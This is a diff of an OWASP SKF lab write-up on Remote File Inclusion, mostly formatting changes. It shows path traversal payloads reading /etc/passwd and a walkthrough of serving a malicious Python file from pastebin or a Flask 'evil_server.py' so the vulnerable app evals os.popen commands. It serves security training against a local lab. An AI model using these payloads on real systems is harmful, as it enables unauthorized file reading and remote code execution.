@@ -1,27 +1,22 @@
 # KBID 173 - Remote File Inclusion
 
-
 ## Running the app
 
-
-
-```text
+```
 $ sudo docker pull blabla1337/owasp-skf-lab:rfi
 ```
 
-```text
+```
 $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:rfi
 ```
 
 {% hint style="success" %}
- Now that the app is running let's go hacking!
+Now that the app is running let's go hacking!
 {% endhint %}
 
 ## Running the app Python3
 
-First, make sure python3 and pip are installed on your host machine.
-After installation, we go to the folder of the lab we want to practise 
-"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
+First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
 
 ```
 $ pip3 install -r requirements.txt
@@ -32,9 +27,8 @@ $ python3 <labname>
 ```
 
 {% hint style="success" %}
- Now that the app is running let's go hacking!
+Now that the app is running let's go hacking!
 {% endhint %}
-
 
 ![Docker Image and write-up thanks to ContraHack!](.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)
 
@@ -46,7 +40,7 @@ Warning: To successfully test for this flaw, the tester needs to have knowledge 
 
 Some Examples:
 
-```text
+```
 http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
 
 Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
@@ -60,7 +54,7 @@ This can lead to something as outputting the contents of the file, but depending
 
 Code execution on the web server
 
-Code execution on the client-side such as JavaScript 
+Code execution on the client-side such as JavaScript
 
 which can lead to other attacks such as:
 
@@ -80,14 +74,11 @@ When we will have a look in our intercepting proxy we can see that the applicati
 
 ![](.gitbook/assets/RFI3.png)
 
-
 To exploit Remote File Inclusion vulnerability, we have two approaches documented in detail below:
-
 
 1. Use pastebin.com to serve the file including system command and include the pastebin raw url:
 
-For E.g.: You may copy the code below to pastebin.com ans save. Then include the raw URL which would look something like "https://pastebin.com/raw/ZLeFHRNf":
-
+For E.g.: You may copy the code below to pastebin.com ans save. Then include the raw URL which would look something like "[https://pastebin.com/raw/ZLeFHRNf](https://pastebin.com/raw/ZLeFHRNf)":
 
 ```
 os.popen('whoami').read()
@@ -95,8 +86,7 @@ os.popen('whoami').read()
 
 ![](.gitbook/assets/RFI31.png)
 
-2. Creating your own webserver: In this case you can use Python Flask to create a small webserver that serves your file. We name it evil_server.py
-
+1. Creating your own webserver: In this case you can use Python Flask to create a small webserver that serves your file. We name it evil\_server.py
 
 ```python
 from flask import Flask, request, url_for, render_template, redirect
@@ -111,19 +101,19 @@ def start():
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=1337)
-	
 ```
+
 Then we create our folder template where we will put our evil.py file with the below content.
 
 ```python
 5 + 5
 ```
 
-Now we are ready to start our evil_server.py and try to make the application load our evil python file and hopefully it will get executed.
+Now we are ready to start our evil\_server.py and try to make the application load our evil python file and hopefully it will get executed.
 
 ![](.gitbook/assets/RFI4.png)
 
-Our remote file inclusion worked and the application seems to load python files and eval() the content of them. This means we can also inject a system command in our evil.py file. 
+Our remote file inclusion worked and the application seems to load python files and eval() the content of them. This means we can also inject a system command in our evil.py file.
 
 ```python
 os.popen('whoami').read()
@@ -131,10 +121,10 @@ os.popen('whoami').read()
 
 ![](.gitbook/assets/RFI5.png)
 
-{% hint style="success" %} 
- Success! As we observed, we can include our own files through RFI. 
+{% hint style="success" %}
+Success! As we observed, we can include our own files through RFI.
 {% endhint %}
 
 ## Additional sources
 
-https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion 
+[https://www.owasp.org/index.php/Testing\_for\_Remote\_File\_Inclusion](https://www.owasp.org/index.php/Testing\_for\_Remote\_File\_Inclusion)
